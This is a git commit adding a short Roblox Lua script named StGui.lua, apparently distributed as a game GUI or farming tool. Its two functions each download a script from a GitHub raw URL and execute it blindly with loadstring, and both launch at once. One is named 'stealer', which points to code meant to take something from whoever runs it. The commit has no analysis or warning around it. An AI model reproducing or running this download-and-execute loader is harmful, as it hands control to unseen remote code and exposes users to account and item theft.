614bd55fa32745a0d4d79a0218e14ce6e704ddca
Unknownloser01001 <cutenies12345@gmail.com>
2025-06-13 21:23:50 +0800

    Add files via upload

---
+++ StGui.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Unknownloser01001/Gui2/refs/heads/main/Gagi.lua'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Unknownloser01001/Gui/refs/heads/main/Itzfreespam1.lua'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
